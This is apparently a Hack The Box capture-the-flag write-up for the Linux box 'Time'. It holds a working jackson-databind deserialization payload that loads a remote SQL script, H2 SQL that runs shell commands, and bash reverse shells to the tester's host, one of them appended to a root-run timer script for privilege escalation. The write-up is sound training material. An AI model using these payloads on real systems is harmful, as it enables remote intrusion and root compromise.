# Time
This box is a HTB Linux made by egotisticalSW & felamos and its IP is
10.10.10.214.

We start by an nmap scan:
```
$ nmap -sC -sV -oA nmap/complete -p- 10.10.10.214
```

Nmap shows port 22 open with OpenSSH banner for Ubuntu  ;
Port 80 open with Apache 2.4.41 ; Online JSON Parser title
Website serves an application form that can Beautify and validate JSON.
The "Validate (beta!)" option hints to us that this feature is still
in development and can probably be abused.

Inputing in this form malformed json prompts us this error:
```
Validation failed:
  Unhandled Java exception:
    com.fasterxml.jackson.databind.exc.MismatchedInputException:
      Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to
      contain As.WRAPPER_ARRAY type information for class java.lang.Object
```

This stacktrace tells us that the application is written in java and uses
`jackson-databind` to validate JSON data.
Many CVEs are available to us to be exploited. After some time practicing
Google Fu, we end up on this article:
https://blog.doyensec.com/2019/07/22/jackson-gadgets.html

Providing this payload, we are able to confirm a Server Side Request Forgery:
```
[
"ch.qos.logback.core.db.DriverManagerConnectionSource",
{
  "url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.44:8000/inject.sql'"
  }
]
```
Our `python3 -m http.server` logs shows the server requesting our `inject.sql`
file. We modify said ̀ inject.sql` file to obtain a reverse shell on the box
```sql
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
       String[] command = {"bash", "-c", cmd};
       		java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
	  return s.hasNext() ? s.next() : "";  }
$$;
CALL SHELLEXEC('bash -i >& /dev/tcp/10.10.14.44/4444 0>&1')
```

We start a netcat listener on our end, then run the payload again on the
application:
```
$ nc -lvnp 4444
connect to [10.10.14.44] from (UNKNOWN) [10.10.10.214] 40234
pericles@time:/var/www/html$ cat /home/pericles/user.txt | wc -c
33
```

We got shell execution on the box as user pericles. We're in.
Moving on to privilege escalation...

We upload to the box, run, then exfil the output of linpeas.sh;
Reading the report we find this:
```
...
[+] .sh files in path
You own the script /usr/bin/timer_backup.sh
```

Reading this script:
```
pericles@time$ cat /usr/bin/timer_backup.sh
zip -r website.bak.zip /var/www/html && mv website.bak.zip /root/backup.zip
```
According to linpeas output, this script is ran via System Timers every 10s as
root. We update the script to make it open yet another reverse shell to our box.

```
pericles@time$ echo "bash -i >& /dev/tcp/10.10.14.44/4445 0>&1" >> /usr/bin/timer_backup.sh
```

Since this reverse-shell will stay open only for as long as the original script
runs, we'll pre-emptively pipe our commands in our netcat:

```
$ nc -lnvp 4445
Listening on [any] 4445
cat /root/root.txt | wc -c
root@time$ cat/root/root.txt
33
```

We owned the root user.